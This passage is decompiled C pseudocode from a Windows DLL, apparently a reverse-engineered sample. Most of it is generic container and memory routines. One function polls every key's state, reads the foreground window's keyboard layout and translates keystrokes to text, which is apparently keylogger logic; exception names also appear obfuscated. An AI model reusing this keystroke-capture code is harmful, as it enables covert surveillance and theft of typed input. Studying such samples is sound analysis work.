  unsigned int i; // ebx
  int v7; // eax
  _DWORD *result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B7F4A);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_100063AF((_DWORD *)(v7 + 8 * i), (_DWORD *)(v7 + 8 * i - 8));
  }
  result = sub_100063AF((_DWORD *)(v7 + 8 * a3), a2);
  ++this[1];
  return result;
}

//----- (10005E6C) --------------------------------------------------------
int __thiscall sub_10005E6C(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10005E84) --------------------------------------------------------
int __thiscall sub_10005E84(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B7F4B);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_100063AF((_DWORD *)(this[3] + 8 * v2), (_DWORD *)(this[3] + 8 * v2 + 8));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_100063AF((_DWORD *)(this[3] + 8 * v4), dword_100BF9DC);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 100BF9DC: using guessed type _DWORD dword_100BF9DC[2];

//----- (10005EDB) --------------------------------------------------------
int __thiscall sub_10005EDB(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B8066);
  return this[3] + 8 * a2;
}

//----- (10005EF9) --------------------------------------------------------
int __thiscall sub_10005EF9(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B8067);
  return this[3] + 8 * a2;
}

//----- (10005F17) --------------------------------------------------------
char *__thiscall sub_10005F17(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_10003339(v3);
  }
  return result;
}

//----- (10005F3D) --------------------------------------------------------
int __thiscall sub_10005F3D(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_10003339(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10005F64) --------------------------------------------------------
BOOL __thiscall sub_10005F64(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10005F6F) --------------------------------------------------------
int __thiscall sub_10005F6F(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    sub_100063AF((_DWORD *)(this[3] + 8 * i), dword_100BF9DC);
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 100BF9DC: using guessed type _DWORD dword_100BF9DC[2];

//----- (10005FB9) --------------------------------------------------------
unsigned int __thiscall sub_10005FB9(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B80EA);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1000602B) --------------------------------------------------------
unsigned int __thiscall sub_1000602B(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10006053) --------------------------------------------------------
unsigned int __stdcall sub_10006053(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10006064) --------------------------------------------------------
unsigned int __thiscall sub_10006064(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 8u, v5, (void (__thiscall *)(void *))sub_10006374, sub_1000341E);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    do
    {
      sub_100063AF((_DWORD *)(8 * v10 + this[3]), (_DWORD *)(8 * v10 + a3));
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10006114) --------------------------------------------------------
void *__thiscall sub_10006114(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  int *v8; // eax
  _DWORD *v9; // edi
  _DWORD *v10; // ebx
  char *i; // eax
  char *v12; // [esp+Ch] [ebp-1Ch]
  int v13; // [esp+10h] [ebp-18h]
  _DWORD *v14; // [esp+14h] [ebp-14h]
  unsigned int v15; // [esp+18h] [ebp-10h]

  result = &loc_1007A7EB;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v13 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v13 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v12 = (char *)this[3];
      v7 = (unsigned __int64)(unsigned int)v13 >> 29 != 0 ? -1 : 8 * v13;
      v8 = (int *)operator new(__CFADD__(v7, 4) ? -1 : v7 + 4);
      if ( v8 )
      {
        v9 = v8 + 1;
        *v8 = v13;
        `eh vector constructor iterator'(v8 + 1, 8u, v13, (void (__thiscall *)(void *))sub_10006374, sub_1000341E);
        v14 = v9;
      }
      else
      {
        v14 = 0;
      }
      v15 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v10 = v14;
        for ( i = (char *)(v12 - (char *)v14); ; i = (char *)(v12 - (char *)v14) )
        {
          sub_100063AF(v10, (_DWORD *)((char *)v10 + (_DWORD)i));
          ++v15;
          v10 += 2;
          if ( v15 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
        }
      }
      this[3] = v14;
      if ( v12 )
        sub_10003339(v12);
      result = (void *)v13;
      this[2] = v13;
    }
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (1000623E) --------------------------------------------------------
_DWORD *__userpurge sub_1000623E@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10006282) --------------------------------------------------------
void __thiscall sub_10006282(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10006458((int)this);
}

//----- (100062D5) --------------------------------------------------------
_DWORD *__userpurge sub_100062D5@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10006319) --------------------------------------------------------
void __thiscall sub_10006319(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10006492((int)this);
}

//----- (10006358) --------------------------------------------------------
_DWORD *__thiscall sub_10006358(_DWORD *Block, char a2)
{
  sub_10005DA1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10006374) --------------------------------------------------------
_DWORD *__thiscall sub_10006374(_DWORD *this)
{
  return sub_100033DA(this, 0);
}

//----- (10006380) --------------------------------------------------------
_DWORD *__stdcall sub_10006380(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_100931D4;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100931D4: using guessed type int (__thiscall *off_100931D4)(void *Block, char);

//----- (100063AF) --------------------------------------------------------
_DWORD *__usercall sub_100063AF@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_10003597((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (100063D4) --------------------------------------------------------
void __usercall sub_100063D4(_DWORD *a1@<edi>)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // eax

  v1 = 0;
  a1[1] = 0;
  a1[2] = 16;
  v2 = operator new(0x84u);
  if ( v2 )
  {
    v1 = v2 + 1;
    *v2 = 16;
    `eh vector constructor iterator'(v2 + 1, 8u, 16, (void (__thiscall *)(void *))sub_10006374, sub_1000341E);
  }
  a1[3] = v1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));

//----- (10006458) --------------------------------------------------------
void __usercall sub_10006458(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10006492) --------------------------------------------------------
void __usercall sub_10006492(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100064EA) --------------------------------------------------------
LONG __stdcall sub_100064EA(int *a1)
{
  sub_1000CE59(a1 + 7);
  sub_1000CE59(a1 + 5);
  sub_1000CE59(a1 + 3);
  return sub_1000CE59(a1 + 1);
}

//----- (1000653A) --------------------------------------------------------
int WriteVBInfo()
{
  int v0; // esi
  _DWORD v2[3]; // [esp+4h] [ebp-18h] BYREF
  int v3; // [esp+18h] [ebp-4h]

  sub_10010428((int)v2);
  v3 = 0;
  sub_1000EFCA();
  v0 = sub_100065C0(0);
  v3 = -1;
  sub_10010466(v2);
  return v0;
}
// 1000653A: using guessed type _DWORD var_18[3];

//----- (1000657D) --------------------------------------------------------
int ReadVBInfo()
{
  int v0; // esi
  _DWORD v2[3]; // [esp+4h] [ebp-18h] BYREF
  int v3; // [esp+18h] [ebp-4h]

  sub_10010428((int)v2);
  v3 = 0;
  sub_1000EFCA();
  v0 = sub_100065C0(1);
  v3 = -1;
  sub_10010466(v2);
  return v0;
}
// 1000657D: using guessed type _DWORD var_18[3];

//----- (100065C0) --------------------------------------------------------
int __stdcall sub_100065C0(int a1)
{
  int v1; // esi
  int v3; // [esp+0h] [ebp-48h] BYREF
  int v4[12]; // [esp+Ch] [ebp-3Ch] BYREF
  int v5; // [esp+44h] [ebp-4h]

  v4[11] = (int)&v3;
  v5 = 0;
  sub_100031D1((__int32)&a1 + 3, (int)&a1 + 3);
  sub_10001AA3((_DWORD *)dword_100BBCC8, v4);
  LOBYTE(v5) = 1;
  dword_100BBC04 = v4[0];
  dword_100BBC08 = v4[2];
  dword_100BBC30 = v4[1];
  dword_100BBC34 = 0;
  v1 = sub_10013547((void (__stdcall *)(int))sub_10006667, (int)&a1);
  LOBYTE(v5) = 0;
  sub_10001B27((int)v4);
  return v1;
}
// 100BBC04: using guessed type int dword_100BBC04;
// 100BBC08: using guessed type int dword_100BBC08;
// 100BBC30: using guessed type int dword_100BBC30;
// 100BBC34: using guessed type int dword_100BBC34;
// 100BBCC8: using guessed type int dword_100BBCC8;

//----- (10006667) --------------------------------------------------------
int __stdcall sub_10006667(_DWORD *a1)
{
  _DWORD *v1; // esi
  _DWORD *v2; // eax
  int v3; // eax
  _DWORD *v4; // eax
  void *v5; // eax
  int v6; // eax
  int v8; // [esp-28h] [ebp-D0h] BYREF
  volatile LONG *v9; // [esp-24h] [ebp-CCh]
  int v10[3]; // [esp-20h] [ebp-C8h] BYREF
  int v11; // [esp-14h] [ebp-BCh]
  int v12; // [esp-10h] [ebp-B8h] BYREF
  volatile LONG *v13; // [esp-Ch] [ebp-B4h]
  int v14; // [esp-8h] [ebp-B0h] BYREF
  volatile LONG *v15; // [esp-4h] [ebp-ACh]
  _DWORD *v16; // [esp+Ch] [ebp-9Ch]
  int v17; // [esp+10h] [ebp-98h]
  int *v18; // [esp+14h] [ebp-94h]
  int v19; // [esp+18h] [ebp-90h] BYREF
  volatile LONG *v20; // [esp+1Ch] [ebp-8Ch]
  void *Block; // [esp+20h] [ebp-88h]
  void *v22; // [esp+24h] [ebp-84h]
  int v23; // [esp+28h] [ebp-80h] BYREF
  volatile LONG *lpAddend; // [esp+2Ch] [ebp-7Ch]
  char v25[8]; // [esp+30h] [ebp-78h] BYREF
  int v26[3]; // [esp+38h] [ebp-70h] BYREF
  int v27[5]; // [esp+44h] [ebp-64h] BYREF
  int v28[17]; // [esp+58h] [ebp-50h] BYREF
  int v29; // [esp+A4h] [ebp-4h]

  v17 = 0;
  LOBYTE(v18) = *a1 == 0;
  if ( (_BYTE)v18 )
  {
    v1 = &unk_100BBBE0;
    v16 = &unk_100BBBE0;
  }
  else
  {
    v16 = &unk_100BBC0C;
    v1 = &unk_100BBC0C;
  }
  sub_100140E1(v1 + 3, (int)v26, 1, 1u, 0);
  v29 = 0;
  Block = operator new(0x28u);
  LOBYTE(v29) = 1;
  if ( Block )
  {
    v14 = (int)v15;
    v22 = &v14;
    sub_10014512(&v14);
    LOBYTE(v29) = 2;
    v2 = sub_10012A7C(&v19, (int)(v1 + 7));
    LOBYTE(v29) = 3;
    v17 = 1;
    v3 = sub_10012BA7((int)v2);
    v29 = 4;
    v4 = sub_10011AFB(0, 0x40000000, Block, v3, 128, 4, v14, v15);
  }
  else
  {
    v4 = 0;
  }
  v29 = 5;
  sub_10006A72(&v23, (int)v4);
  v29 = 7;
  if ( (v17 & 1) != 0 )
  {
    v17 &= ~1u;
    sub_10012AAC(&v19);
  }
  v5 = operator new(0x94u);
  v22 = v5;
  LOBYTE(v29) = 8;
  if ( v5 )
    v6 = sub_10001B80((int)v5, (char)v18, v16[10]);
  else
    v6 = 0;
  LOBYTE(v29) = 7;
  sub_100069E1(&v19, v6);
  LOBYTE(v29) = 9;
  sub_1001C5B0((int)v25);
  LOBYTE(v29) = 10;
  sub_10016983((void *)6, (int)v27, &unk_10092EBC);
  LOBYTE(v29) = 11;
  v15 = (volatile LONG *)v25;
  v14 = 6291456;
  v22 = &v12;
  v13 = lpAddend;
  v12 = v23;
  InterlockedIncrement(lpAddend);
  LOBYTE(v29) = 12;
  v11 = v16[9];
  Block = v10;
  sub_100141F3(v10, (int)v26);
  LOBYTE(v29) = 13;
  v18 = &v8;
  v9 = v20;
  v8 = v19;
  InterlockedIncrement(v20);
  LOBYTE(v29) = 11;
  sub_1001C336(v27, (int)v28, v8, v9, v10[0], v10[1], v10[2], v11, v12, v13, v14, (int)v15);
  LOBYTE(v29) = 15;
  sub_1001C3E1(v28);
  LOBYTE(v29) = 11;
  sub_1000690F(v28);
  LOBYTE(v29) = 10;
  sub_10016B53(v27);
  LOBYTE(v29) = 9;
  sub_1001C62A(v25);
  LOBYTE(v29) = 7;
  sub_10006A25(&v19);
  LOBYTE(v29) = 0;
  sub_10003B09(&v23);
  v29 = -1;
  sub_100141CF(v26);
  return 1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10006667: using guessed type int var_70[3];
// 10006667: using guessed type int var_64[5];
// 10006667: using guessed type int var_50[17];

//----- (1000690F) --------------------------------------------------------
void __stdcall sub_1000690F(int *a1)
{
  sub_10016B53(a1 + 11);
  sub_10003B09(a1 + 6);
  sub_100141CF(a1 + 2);
  sub_10006A25(a1);
}

//----- (1000695E) --------------------------------------------------------
LONG sub_1000695E()
{
  int v0; // eax
  int v1; // eax
  int v3[3]; // [esp+4h] [ebp-18h] BYREF
  int v4; // [esp+18h] [ebp-4h]

  v0 = sub_100140E1(dword_100BBBEC, (int)v3, 1, 1u, 0);
  v4 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v0 + 16))(v0);
  v4 = -1;
  sub_100141CF(v3);
  v1 = sub_100140E1(dword_100BBC18, (int)v3, 1, 1u, 0);
  v4 = 1;
  (*(void (__thiscall **)(int))(*(_DWORD *)v1 + 16))(v1);
  v4 = -1;
  return sub_100141CF(v3);
}
// 100BBBEC: using guessed type _DWORD dword_100BBBEC[2];
// 100BBC18: using guessed type _DWORD dword_100BBC18[2];
// 1000695E: using guessed type int var_18[3];

//----- (100069E1) --------------------------------------------------------
_DWORD *__userpurge sub_100069E1@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10006A25) --------------------------------------------------------
void __thiscall sub_10006A25(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10006AC8((int)this);
}

//----- (10006A5E) --------------------------------------------------------
_DWORD *__usercall sub_10006A5E@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>)
{
  volatile LONG *v2; // ecx

  v2 = (volatile LONG *)a1[1];
  a2[1] = v2;
  *a2 = *a1;
  InterlockedIncrement(v2);
  return a2;
}

//----- (10006A72) --------------------------------------------------------
_DWORD *__userpurge sub_10006A72@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10006AC8) --------------------------------------------------------
void __usercall sub_10006AC8(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10006B51) --------------------------------------------------------
char __thiscall sub_10006B51(__int16 *this, int a2)
{
  int *v2; // eax
  HWND ForegroundWindow; // esi
  SHORT v5; // bx
  int v6; // eax
  DWORD WindowThreadProcessId; // eax
  UINT *v8; // eax
  int v9; // ebx
  WCHAR *v10; // edi
  UINT *v11; // esi
  UINT *v12; // eax
  UINT v13; // eax
  int v14; // eax
  int v15; // ebx
  _DWORD *v16; // eax
  _DWORD *v17; // eax
  char *v18; // eax
  char *v19; // eax
  int *v20; // eax
  HKL v21; // [esp-4h] [ebp-194h]
  unsigned int i; // [esp+Ch] [ebp-184h]
  int nVirtKey; // [esp+10h] [ebp-180h] BYREF
  int v25; // [esp+14h] [ebp-17Ch] BYREF
  int v26; // [esp+18h] [ebp-178h] BYREF
  int v27; // [esp+1Ch] [ebp-174h] BYREF
  unsigned int v28; // [esp+20h] [ebp-170h]
  UINT *pExceptionObject; // [esp+2Ch] [ebp-164h] BYREF
  HKL dwhkl; // [esp+30h] [ebp-160h]
  int v31; // [esp+34h] [ebp-15Ch]
  int v32[2]; // [esp+38h] [ebp-158h] BYREF
  int v33[2]; // [esp+40h] [ebp-150h] BYREF
  int v34[5]; // [esp+48h] [ebp-148h] BYREF
  int v35[9]; // [esp+5Ch] [ebp-134h] BYREF
  BYTE KeyState[260]; // [esp+80h] [ebp-110h] BYREF
  int v37; // [esp+18Ch] [ebp-4h]

  sub_1000CC20(&v25, word_100B89D4);
  v37 = 0;
  sub_10002C25(&v26, (int *)(a2 + 8));
  v37 = -1;
  sub_1000CE59(&v25);
  v2 = (int *)sub_10016983(0, (int)v34, 0);
  v37 = 1;
  v31 = a2 + 12;
  sub_10016B2F(v2, a2 + 12);
  v37 = -1;
  sub_10016B53(v34);
  ForegroundWindow = GetForegroundWindow();
  if ( !ForegroundWindow )
    return 0;
  sub_10007816(&v27);
  v37 = 2;
  memset(KeyState, 0, 0x100u);
  for ( nVirtKey = 0; (unsigned int)nVirtKey < 0x100; ++nVirtKey )
  {
    v5 = GetKeyState(nVirtKey);
    v6 = nVirtKey;
    if ( v5 < 0 )
    {
      KeyState[nVirtKey] |= 0x80u;
      if ( this[v6 + 2] >= 0 )
      {
        sub_1000794D(&v27, (int)&nVirtKey);
        v6 = nVirtKey;
      }
    }
    if ( (v5 & 1) != 0 )
      KeyState[v6] |= 1u;
    this[v6 + 2] = v5;
  }
  if ( !(*(int (__thiscall **)(int *))(v27 + 4))(&v27) )
  {
    v37 = -1;
    sub_10007890((int)&v27);
    return 0;
  }
  sub_10017D60(v35);
  LOBYTE(v37) = 3;
  WindowThreadProcessId = GetWindowThreadProcessId(ForegroundWindow, 0);
  dwhkl = GetKeyboardLayout(WindowThreadProcessId);
  for ( i = 0; i < v28; ++i )
  {
    v8 = (UINT *)(*(int (__thiscall **)(int *, unsigned int))(v27 + 44))(&v27, i);
    if ( (int)MapVirtualKeyExA(*v8, 2u, dwhkl) <= 0 )
    {
      v19 = (char *)(*(int (__thiscall **)(int *, unsigned int))(v27 + 44))(&v27, i);
      sub_10017E1B(v35, *v19);
    }
    else
    {
      sub_1000CC90(256, &v25);
      LOBYTE(v37) = 4;
      v9 = *(_DWORD *)(v26 + 28);
      sub_1000CF22(&v25);
      v10 = *(WCHAR **)(v26 + 12);
      v11 = (UINT *)(*(int (__thiscall **)(int *, unsigned int))(v27 + 44))(&v27, i);
      v12 = (UINT *)(*(int (__thiscall **)(int *, unsigned int))(v27 + 44))(&v27, i);
      v21 = dwhkl;
      pExceptionObject = v12;
      v13 = MapVirtualKeyA(*v11, 0);
      v14 = ToUnicodeEx(*pExceptionObject, v13, KeyState, v10, v9, 0, v21);
      v15 = v14;
      if ( v14 <= 0 )
      {
        if ( v14 )
        {
          sub_10016441(&pExceptionObject);
          _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
        }
        v18 = (char *)(*(int (__thiscall **)(int *, unsigned int))(v27 + 44))(&v27, i);
        sub_10017E1B(v35, *v18);
      }
      else
      {
        sub_1000CF22(&v25);
        *(_WORD *)(*(_DWORD *)(v26 + 12) + 2 * v15) = 0;
        v16 = sub_100083EF(a2, v32);
        LOBYTE(v37) = 5;
        v17 = sub_1000D027(v33, (int)v16, (int)&v25);
        LOBYTE(v37) = 6;
        sub_10008463((int)v17, a2);
        LOBYTE(v37) = 5;
        sub_1000CE59(v33);
        LOBYTE(v37) = 4;
        sub_1000CE59(v32);
      }
      LOBYTE(v37) = 3;
      sub_1000CE59(&v25);
    }
  }
  v20 = (int *)sub_10017EAF(v35, (int)v34);
  LOBYTE(v37) = 7;
  sub_10016B2F(v20, v31);
  LOBYTE(v37) = 3;
  sub_10016B53(v34);
  LOBYTE(v37) = 2;
  sub_10017DC3((int)v35);
  v37 = -1;
  sub_10007890((int)&v27);
  return 1;
}
// 100B89D4: using guessed type wchar_t word_100B89D4[2];
// 10006B51: using guessed type int var_148[5];
// 10006B51: using guessed type BYTE KeyState[260];
// 10006B51: using guessed type int var_134[9];

//----- (10006EE8) --------------------------------------------------------
_DWORD *__thiscall sub_10006EE8(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_100074E0(this, v3, 0);
  else
    v4 = 0;
  sub_10007C4C(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10006F45) --------------------------------------------------------
_DWORD *__thiscall sub_10006F45(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10007650(this, v3, 0);
  else
    v4 = 0;
  sub_10007CE3(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10006FA2) --------------------------------------------------------
_DWORD *__thiscall sub_10006FA2(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_100074E0(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10007C4C(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10007007) --------------------------------------------------------
_DWORD *__thiscall sub_10007007(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10007650(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10007CE3(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000706C) --------------------------------------------------------
_DWORD *__thiscall sub_1000706C(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_100074E0(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10007C4C(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100070EB) --------------------------------------------------------
_DWORD *__thiscall sub_100070EB(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
